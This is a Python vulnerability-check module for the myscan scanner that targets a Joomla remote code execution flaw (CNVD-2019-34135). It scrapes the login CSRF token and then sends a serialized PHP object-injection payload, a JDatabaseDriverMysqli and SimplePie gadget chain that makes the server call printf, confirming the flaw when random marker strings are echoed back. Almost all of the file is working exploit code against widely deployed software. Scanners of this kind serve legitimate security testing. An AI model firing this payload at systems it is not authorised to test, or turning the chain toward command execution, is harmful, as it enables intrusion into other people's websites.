#!/usr/bin/env python3
# @Time    : 2020-05-11
# @Author  : caicai
# @File    : poc_joomla-cnvd-2019-34135-rce_2019.py


from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
# from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.common import get_random_str
import re
import requests
import urllib3

urllib3.disable_warnings()


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "joomla-cnvd-2019-34135-rce"
        self.vulmsg = "referer : https://www.exploit-db.com/exploits/47465"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "GET",
            "url": self.url,
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "timeout": 10,
            "allow_redirects": True,
            "verify": False,
        }
        try:
            request = requests.Session()
            r = request.request(**req)
            res = re.search('<input\stype="hidden"\sname="(?P<token>\S{32})', r.text)
            if r != None and r.status_code == 200 and res:
                random_str1 = get_random_str(10).lower()
                random_str2 = get_random_str(10).lower()
                req["method"] = "POST"
                req[
                    "data"] = '''username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&{token}=1&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22printf%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A43%3A%22http%3A%2F%2FRayTest.6666%2F%3B{r1}%%{r2}%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login'''.format(
                    token=res.groupdict().get("token"), r1=random_str1, r2=random_str2)
                r1 = request.request(**req)
                if r1 != None and (random_str1 + "%" + random_str2).encode() in r1.content:
                    parser_ = response_parser(r1)
                    self.result.append({
                        "name": self.name,
                        "url": self.url,
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "request": parser_.getrequestraw(),
                            "response": parser_.getresponseraw()
                        }
                    })
        except :
            pass
